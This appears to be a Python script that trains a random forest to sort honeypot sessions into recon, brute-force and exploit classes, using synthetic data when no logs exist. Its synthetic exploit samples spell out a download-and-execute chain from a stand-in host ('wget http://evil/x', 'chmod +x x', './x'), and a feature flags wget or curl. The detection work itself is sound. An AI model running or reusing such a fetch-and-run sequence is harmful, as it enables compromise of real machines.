# src/ml_prepare.py
import json, random
from pathlib import Path
import numpy as np
from sklearn.ensemble import RandomForestClassifier
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report, confusion_matrix
import joblib

# produce tiny synthetic dataset from session JSONs (or generate)
def make_sample(event_texts):
    txt = " ".join(event_texts).lower()
    return [
        1 if "wget" in txt or "curl" in txt else 0,   # wget flag
        sum(1 for _ in txt.split() if "failed" in _) if "failed" in txt else txt.count("failed"), # crude
        len(event_texts)
    ]

# If you already have data/sessions, read them; else create synthetic data
data_dir = Path(__file__).resolve().parents[1] / "data" / "sessions"
X, y = [], []

if data_dir.exists() and any(data_dir.iterdir()):
    for s in data_dir.iterdir():
        meta = json.loads((s/"meta.json").read_text())
        events = [e.get("text","") for e in meta.get("events",[])]
        features = make_sample(events)
        # Heuristic label from text to bootstrap (you will replace with real labels later)
        label = "exploit" if features[0]==1 and features[2]>2 else ("bruteforce" if "failed" in " ".join(events).lower() else "recon")
        X.append(features); y.append(label)
else:
    # Synthetic small dataset
    for _ in range(200):
        t = random.choice(["recon","bruteforce","exploit"])
        if t=="recon":
            ev = ["nmap scan","uname -a"]
        elif t=="bruteforce":
            ev = ["failed login","failed login","failed login","whoami"]
        else:
            ev = ["wget http://evil/x","chmod +x x","./x"]
        X.append(make_sample(ev)); y.append(t)

# encode labels
labels = {"recon":0,"bruteforce":1,"exploit":2}
y_num = [labels[z] for z in y]
X = np.array(X)
y_num = np.array(y_num)

Xtr,Xte,ytr,yte = train_test_split(X,y_num,test_size=0.2,random_state=42)
clf = RandomForestClassifier(n_estimators=100, random_state=42)
clf.fit(Xtr,ytr)
pred = clf.predict(Xte)
print("Classification report:\n", classification_report(yte, pred, target_names=list(labels.keys())))
print("Confusion matrix:\n", confusion_matrix(yte, pred))

# save model + label map
model_dir = Path(__file__).resolve().parents[1] / "src" / "models"
model_dir.mkdir(parents=True, exist_ok=True)
joblib.dump(clf, model_dir/"rf_honeypot.pkl")
joblib.dump(labels, model_dir/"label_map.pkl")
print("Saved model to", model_dir)
